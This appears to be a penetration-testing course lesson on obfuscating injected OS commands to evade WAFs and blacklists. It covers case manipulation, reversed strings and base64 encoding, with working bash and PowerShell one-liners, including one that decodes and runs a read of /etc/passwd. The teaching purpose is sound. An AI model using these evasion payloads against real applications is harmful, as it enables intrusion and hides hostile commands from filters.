# Advanced Command Obfuscation

In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

## Case Manipulation

One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

### Windows Example

In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:

```powershell
PS C:\htb> WhOaMi
21y4d
```

### Linux Example

When it comes to Linux and a bash shell, which are case-sensitive, we have to get a bit creative. One working command we can use is:

```bash
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
21y4d
```

This command uses `tr` to replace all upper-case characters with lower-case characters. However, if we try to use this command with the Host Checker web application, it still gets blocked because the command contains spaces, which is a filtered character.

Once we replace the spaces with tabs (`%09`), the command works perfectly.

**Alternative command:**
```bash
$(a="WhOaMi";printf %s "${a,,}")
```

## Reversed Commands

Another command obfuscation technique is reversing commands and having a command template that switches them back and executes them in real-time. Instead of `whoami`, we write `imaohw` to avoid triggering the blacklist.

### Linux Example

First, get the reversed string:

```bash
$ echo 'whoami' | rev
imaohw
```

Then, execute by reversing it back in a sub-shell:

```bash
$ $(rev<<<'imaohw')
21y4d
```

### Windows Example

First, reverse the string:

```powershell
PS C:\htb> "whoami"[-1..-20] -join ''
imaohw
```

Then, execute using PowerShell sub-shell:

```powershell
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
21y4d
```

**Tip:** If you wanted to bypass a character filter with this method, you'd have to reverse them as well, or include them when reversing the original command.

## Encoded Commands

The final technique is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. Instead of copying existing commands, create your own unique obfuscation command to bypass filters and WAFs.

### Linux Example (Base64)

Encode the payload:

```bash
$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Decode and execute:

```bash
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Tip:** We use `<<<` to avoid using a pipe `|`, which is a filtered character.

### Windows Example (Base64)

Encode the string:

```powershell
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA
```

Decode and execute:

```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
21y4d
```

**Note:** On Linux with UTF-16 conversion:

```bash
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
dwBoAG8AYQBtAGkA
```

## Additional Techniques

In addition to the techniques discussed, you can utilize numerous other methods, such as:
- Wildcards
- Regex
- Output redirection
- Integer expansion

For more techniques, see [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).
